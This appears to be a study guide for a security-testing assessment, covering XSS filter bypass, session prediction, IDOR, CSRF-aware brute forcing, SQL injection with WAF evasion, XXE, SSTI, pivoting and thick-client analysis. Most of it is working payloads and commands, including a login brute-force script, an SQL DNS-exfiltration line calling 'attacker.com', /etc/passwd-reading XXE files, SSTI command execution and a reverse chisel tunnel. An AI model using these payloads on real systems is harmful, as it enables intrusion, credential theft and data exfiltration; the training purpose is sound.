# 🔴 DIFFICULT Challenges (Success Ratio: 18%)

> This tier separates good candidates from great ones. Mastering these gives you a significant edge.

---

## Challenge 11: XSS via Weak Client-Side Validation

### What They Test
Can you bypass weak XSS filters implemented on the client side?

### Methodology
1. Test basic XSS → observe what gets filtered
2. Bypass **client-side** filters (they run in browser only)
3. Use Burp to inject payload **after** client-side filtering

### Payloads (Filter Bypass)
```html
<!-- If <script> is filtered -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>

<!-- If alert is filtered -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>

<!-- If parentheses are filtered -->
<img src=x onerror=alert`1`>
<svg onload=alert&lpar;1&rpar;>

<!-- If quotes are filtered -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<img src=x onerror=alert(/xss/)>

<!-- If spaces are filtered -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### Steps
```
1. Submit basic payload: <script>alert(1)</script>
2. Check source to see what was modified/filtered
3. Intercept in Burp → send payload directly (bypass client JS)
4. If still filtered, try alternative event handlers
5. If encoding is needed, try HTML entities / URL encoding / Unicode
```

---

## Challenge 13: Weak Session ID

### What They Test
Can you predict or forge session identifiers?

### Methodology
1. **Collect** multiple session IDs
2. **Analyze** the pattern (sequential, timestamp-based, weak random)
3. **Predict** the next valid session ID

### Steps
```
1. Login multiple times → collect session cookies
2. Analyze pattern:
   - Sequential: 1001, 1002, 1003 → next is 1004
   - Timestamp: base64(timestamp + userid) → predictable
   - Weak hash: MD5(username) → compute for target user

3. Use Burp Sequencer:
   - Capture login response
   - Send to Sequencer
   - Collect 1000+ tokens
   - Analyze entropy and randomness
   - Identify weak bits

4. Tools:
   Burp Suite Sequencer (built-in analysis)
   OWASP SessionAnalyzer
```

### Common Weak Patterns
| Pattern            | Example           | Attack                    |
| ------------------ | ----------------- | ------------------------- |
| Sequential integer | `session=1234`    | Increment/decrement       |
| Base64(user:time)  | `YWRtaW46MTY3...` | Decode, modify, re-encode |
| MD5(username)      | `21232f297a57...` | Hash known usernames      |
| Timestamp-based    | `1709123456`      | Predict future timestamps |

---

## Challenge 14: Insecure Direct Object Reference (IDOR)

### What They Test
Can you access other users' resources by manipulating object references?

### Methodology
```bash
# Test numeric IDs
GET /api/user/profile?id=1001   # Your profile
GET /api/user/profile?id=1002   # Someone else's profile

# Test in URLs
GET /documents/download/1234    # Your document
GET /documents/download/1235    # Someone else's document

# Test in POST body
POST /api/order {"order_id": "ABC123"}  # Your order
POST /api/order {"order_id": "ABC124"}  # Someone else's order

# Test encoded/hashed IDs
# If ID is base64: decode → modify → re-encode
# If ID is UUID: try sequential or leaked UUIDs
# If ID is hashed: try hashing sequential numbers

# Test with different HTTP methods
GET /api/users/1002    # might be blocked
PUT /api/users/1002    # might not be checked
DELETE /api/users/1002 # might not be checked
```

### Checklist
- [ ] Change numeric IDs (increment/decrement)
- [ ] Change UUIDs to other known UUIDs
- [ ] Decode and modify encoded IDs (Base64, URL)
- [ ] Test with and without authorization header
- [ ] Test different HTTP methods on same resource
- [ ] Check API responses for extra user IDs/references

---

## Challenge 16: Brute Force on CSRF-Enabled Page

### What They Test
Can you brute force a form that has CSRF token protection?

### Methodology
1. Observe that each request needs a **valid CSRF token**
2. **Extract** the CSRF token before each brute force attempt
3. Use **Burp macros** or **scripts** to automate

### Burp Suite Macro Approach
```
1. Project Options → Sessions → Session Handling Rules → Add
2. Rule Actions → Add → Run a Macro
3. Define macro:
   a. Record: GET request to the login page (to get fresh CSRF token)
   b. Configure parameter extraction from macro response
4. Scope: set to target URL
5. Now Intruder will auto-fetch new CSRF token for each attempt
```

### Python Script Approach
```python
import requests
from bs4 import BeautifulSoup

url = "http://target.com/login"
session = requests.Session()

passwords = open("passwords.txt").read().splitlines()

for password in passwords:
    # Step 1: Get fresh CSRF token
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf_token"})["value"]
    
    # Step 2: Login with CSRF token
    data = {
        "username": "admin",
        "password": password,
        "csrf_token": csrf_token
    }
    resp = session.post(url, data=data)
    
    if "Invalid" not in resp.text:
        print(f"[+] Found password: {password}")
        break
```

---

## Challenge 19: SQL Injection via WAF Bypass

### What They Test
Can you bypass a Web Application Firewall to perform SQL injection?

### WAF Bypass Techniques
```sql
-- Inline comments
UNI/**/ON SEL/**/ECT 1,2,3
UN/**/ION SE/**/LECT 1,2,3

-- Double URL encoding
%2527 → %27 → '
%252f%252a → /*

-- Case variation
uNiOn SeLeCt 1,2,3

-- Using equivalent functions
CONCAT() → CONCAT_WS()
CHAR() → 0x hex
SUBSTRING() → MID(), SUBSTR(), LEFT(), RIGHT()

-- Whitespace alternatives
UNION%0aSELECT    (newline)
UNION%09SELECT    (tab)
UNION%0bSELECT    (vertical tab)
UNION%0cSELECT    (form feed)
UNION%a0SELECT    (non-breaking space)
UNION/**/SELECT   (comment)

-- String concatenation (avoid keywords)
'ad'||'min'         -- Oracle, PostgreSQL
CONCAT('ad','min')  -- MySQL
'ad'+'min'          -- MSSQL

-- Numeric obfuscation
1 OR 1=1  →  1 OR 2>1  →  1 OR 0x1=0x1

-- HTTP Parameter Pollution
?id=1 UNION&id=SELECT 1,2,3

-- JSON/XML wrapping
{"id": "1 UNION SELECT 1,2,3"}
```

---

## Challenge 20: Advanced SQL Injection

### What They Test
Can you perform SQL injection in complex scenarios?

### Methodology
```sql
-- Error-based (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1) --

-- Time-based blind
' OR IF(1=1, SLEEP(5), 0) --
' OR IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
'; WAITFOR DELAY '0:0:5' --   (MSSQL)

-- Boolean-based blind
' OR 1=1 --   (returns normal page)
' OR 1=2 --   (returns different page)
' OR SUBSTRING(database(),1,1)='a' --

-- UNION-based extraction
' UNION SELECT NULL,NULL,NULL --               # Find column count
' UNION SELECT 1,2,3 --                       # Identify displayed columns
' UNION SELECT 1,database(),3 --              # Get database name
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1,username,password FROM users --

-- Second-order SQLi
# Store payload in profile: admin'--
# When profile is loaded elsewhere, the injection executes

-- Out-of-band (DNS exfiltration)
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a')) --
```

### SQLMap Advanced Usage
```bash
# Basic
sqlmap -u "http://target.com/page?id=1" --dbs

# With WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --random-agent

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" -p user

# With cookies/auth
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Dump specific table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
```

---

## Challenge 22: XXE Vulnerabilities in File Parsing Functionality

### What They Test
Can you exploit XXE through uploaded files (DOCX, XLSX, SVG, PDF)?

### Methodology
Office documents (DOCX, XLSX) are actually ZIP files containing XML. Inject XXE into the XML within.

### DOCX/XLSX XXE
```bash
# 1. Create a normal .docx file
# 2. Unzip it
mkdir xxe_doc && cd xxe_doc
unzip ../normal.docx

# 3. Edit [Content_Types].xml or word/document.xml
# Add DTD at the top:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
# Reference &xxe; in the document body

# 4. Rezip
zip -r ../malicious.docx .

# 5. Upload the malicious file
```

### SVG XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="50">&xxe;</text>
</svg>
```

---

## Challenge 28 & 33: Hard Coded Secrets in Application 1 & 3

### What They Test
Can you find secrets hardcoded in application source code?

### Methodology
```bash
# In browser DevTools (F12)
# Sources tab → search all files for:
password, secret, key, token, api_key, apikey, 
authorization, auth, credential, private

# Check JavaScript files
# Look in: .js, .js.map, .json, .env, .config files

# Check HTML comments
<!-- TODO: remove before production, password is admin123 -->

# Check network requests for exposed configs
/api/config
/api/settings
/.env
/config.json
/app.config

# Common patterns to search for
grep -r "password" ./
grep -r "api_key" ./
grep -r "secret" ./
grep -r "token" ./
grep -r "AWS_" ./
grep -r "PRIVATE_KEY" ./
```

### Where to Look
- JavaScript source files (including minified - use beautifier)
- Source maps (`.js.map`)
- HTML comments
- Configuration endpoints
- Mobile app APK/IPA (decompile)
- Git repositories (`.git/` directory)
- Environment files (`.env`, `.env.example`)

---

## Challenge 34: Network Traffic Analysis & Reproduce Attack

### What They Test
Can you analyze a PCAP file and reproduce the attack you find?

### Methodology
```bash
# Open in Wireshark
wireshark capture.pcap

# Quick analysis
# Statistics → Protocol Hierarchy
# Statistics → Conversations
# Statistics → Endpoints

# Filter for interesting traffic
http                          # All HTTP
http.request                  # All HTTP requests
tcp.port == 4444             # Common reverse shell port
ftp                          # FTP credentials (plaintext)
smtp                         # Email traffic
dns                          # DNS queries
tcp contains "password"       # Search for password in traffic

# Extract credentials
# Edit → Find Packet → String → "password"
# Edit → Find Packet → String → "login"

# Follow HTTP stream
# Right-click on packet → Follow → HTTP Stream

# Export objects (files transferred)
# File → Export Objects → HTTP

# tshark (command line)
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "ftp.request.command == USER || ftp.request.command == PASS"
```

### Steps to Reproduce
1. Identify the attack type from PCAP
2. Note the target IP, port, payload
3. Rebuild the attack using same tools/methods
4. Execute against the target

---

## Challenge 35: Insecure Cloud Storage

### What They Test
Can you find and access misconfigured cloud storage?

### Methodology
```bash
# AWS S3
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/file.txt . --no-sign-request

# Find bucket names
# Look in: HTML source, JavaScript, DNS records, error messages
# Common patterns: company-backup, company-assets, company-dev

# Enumerate S3 buckets
# https://bucket-name.s3.amazonaws.com
# https://s3.amazonaws.com/bucket-name

# Azure Blob Storage
# https://account.blob.core.windows.net/container/
curl https://storageaccount.blob.core.windows.net/container?restype=container&comp=list

# GCP Cloud Storage
# https://storage.googleapis.com/bucket-name/
gsutil ls gs://bucket-name

# Tools
# GrayhatWarfare - https://buckets.grayhatwarfare.com
# cloud_enum - https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k target-company
```

---

## Challenge 36: Root2Root Challenge

### What They Test
Can you escalate from one root-level access to another system?

### Methodology (Pivoting)
```bash
# After gaining root on first machine:

# 1. Network discovery
ip addr show
arp -a
cat /etc/hosts
netstat -tlnp
nmap -sn 192.168.1.0/24

# 2. Port forwarding / tunneling
# SSH local forward
ssh -L 8080:internal-target:80 user@pivot-machine

# SSH dynamic SOCKS proxy
ssh -D 1080 user@pivot-machine
proxychains nmap internal-target

# Chisel
# On attacker: chisel server -p 8000 --reverse
# On pivot: chisel client ATTACKER:8000 R:socks

# 3. Credential reuse
# Try found credentials on other machines
# Check for SSH keys in /root/.ssh/ and /home/*/.ssh/
# Check /etc/shadow, database configs, config files

# 4. Lateral movement with found creds
ssh root@internal-target
psexec.py admin:password@internal-target
```

---

## Challenges 37, 39, 41: Code Review Challenges

### Challenge 37: Code Review - XSS Filter Bypass
```python
# VULNERABLE: Blacklist-based filter
def sanitize(input):
    input = input.replace("<script>", "")
    input = input.replace("</script>", "")
    return input

# BYPASS: <scr<script>ipt>alert(1)</scr<script>ipt>
# BYPASS: <Script>alert(1)</Script>
# BYPASS: <img src=x onerror=alert(1)>

# LOOK FOR:
# - Case-sensitive checks (bypass with mixed case)
# - Single-pass replacement (bypass with nesting)
# - Blacklist approach (bypass with unlisted tags)
# - Only checking <script> but not event handlers
```

### Challenge 39: Code Review - CAPTCHA Bypass
```python
# VULNERABLE: CAPTCHA checked client-side only
# BYPASS: Remove CAPTCHA field from request in Burp

# VULNERABLE: CAPTCHA value stored in session/cookie
# BYPASS: Read CAPTCHA from cookie/hidden field

# VULNERABLE: CAPTCHA not invalidated after use
# BYPASS: Reuse the same CAPTCHA answer multiple times

# VULNERABLE: CAPTCHA validated but result not tied to action
# BYPASS: Solve CAPTCHA once, then replay the token

# LOOK FOR:
# - Is CAPTCHA validated server-side?
# - Is CAPTCHA one-time-use?
# - Is CAPTCHA response tied to the specific request?
# - Can CAPTCHA be solved via OCR (weak CAPTCHA)?
```

### Challenge 41: Code Review - SSTI (Server-Side Template Injection)
```python
# VULNERABLE (Jinja2)
template = f"Hello {user_input}"
return render_template_string(template)

# TEST: Submit {{7*7}} → if output is 49, SSTI confirmed

# PAYLOADS (Jinja2 / Python):
{{7*7}}
{{config}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}

# Payloads (Twig / PHP):
{{7*7}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{'/etc/passwd'|file_excerpt(1,30)}}

# Payloads (Freemarker / Java):
${7*7}
<#assign cmd="freemarker.template.utility.Execute"?new()>${cmd("id")}

# ERB (Ruby):
<%= 7*7 %>
<%= system("whoami") %>

# LOOK FOR:
# - User input directly in template string
# - f-strings or string concatenation building templates
# - render_template_string() with user input
# - No input sanitization before template rendering
```

---

## Challenges 42 & 43: Thick/Thin Client Application (.NET and Python)

### .NET Thick Client (Challenge 42)
```bash
# 1. Decompile with dnSpy or ILSpy
dnSpy.exe application.exe

# 2. Look for:
# - Hardcoded credentials
# - Connection strings
# - API endpoints
# - Encryption keys
# - License check bypasses

# 3. Common locations in code:
# App.config / Web.config → connection strings
# AssemblyInfo.cs → version info
# Resources → embedded files

# 4. Memory analysis
# Use Process Hacker to inspect running process memory

# 5. Traffic analysis
# Proxy .NET traffic through Burp (may need to add proxy settings)
# Check for certificate pinning

# 6. DLL injection / patching
# Modify IL code in dnSpy → save module → run modified binary
```

### Python Thick Client (Challenge 43)
```bash
# 1. If compiled (exe), decompile with pyinstxtractor
python pyinstxtractor.py application.exe
# Then decompile .pyc files:
uncompyle6 extracted_file.pyc

# 2. Look for:
# - Hardcoded secrets in Python source
# - Insecure API calls
# - SQL injection in database queries
# - Pickle deserialization vulnerabilities
# - Eval/exec with user input

# 3. Proxy traffic
# Set HTTP_PROXY environment variable
# Or use mitmproxy/Burp

# 4. Memory/runtime analysis
# Attach debugger
# Use Frida for hooking Python functions
```
